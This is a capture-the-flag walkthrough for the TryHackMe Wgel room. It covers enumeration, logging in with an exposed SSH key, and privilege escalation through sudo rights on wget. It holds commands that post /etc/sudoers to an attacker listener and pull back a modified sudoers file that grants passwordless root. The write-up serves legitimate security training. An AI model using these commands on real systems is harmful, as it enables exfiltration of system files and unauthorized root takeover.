# Wgel CTF - TryHackMe Room
# **!! SPOILERS !!**
#### This repository documents my walkthrough for the **Wgel** CTF challenge on [TryHackMe](https://tryhackme.com/room/wgelctf). 
---

we see 2 open ports: 22 and 80

![scn](imgs/scn.png "scn")

we can find default Apache webpage with comment that might reveal potential username : jessie

![comm](imgs/comm.png "comm")

using feroxbuster to discover hidden folders, we found `/sitemap`

![ferox1](imgs/ferox1.png "ferox1")

enumerating the `/sitemap` folder 

![ferox2](imgs/ferox2.png "ferox2")

now we found `/sitemap/.ssh`

there is RSA private key on the website

![ssh](imgs/ssh.png "ssh")

i tried to login with this key as jessie via ssh and it worked

![sshl](imgs/sshl.png "sshl")

we need to find user flag, using simple find command: 

```
find / -type f -name "user*"
```

user flag is in `/home/jessie/Documents/`

![user](imgs/user.png "user")

sudo -l output:

![sudol](imgs/sudol.png "sudol")

checking GTFObins for PE vector

![gtfo](imgs/gtfo.png "gtfo")

this doesnt seem to work

to get root shell we need to send /etc/sudoers to our own machine, modify the file and send modified file back to the victim

first we start nc listiner to get sudoers file and then we run this command on victim:

```
sudo /usr/bin/wget --post-file=/etc/sudoers 10.14.X.X:4445
```

![nc](imgs/nc.png "nc")

we got original file

now we modify the sudoers file to let us sudo su without password

![sudoers](imgs/sudoers.png "sudoers")

now we need to swap the current sudoers file with changed one from our machine using:

```
$ cd /etc
$ sudo /usr/bin/wget 10.14.X.X:8081/sudoers --output-document=sudoers
```

now we can run sudo su, we now have root access and root flag

![root](imgs/root.png "root")

# MACHINE PWNED
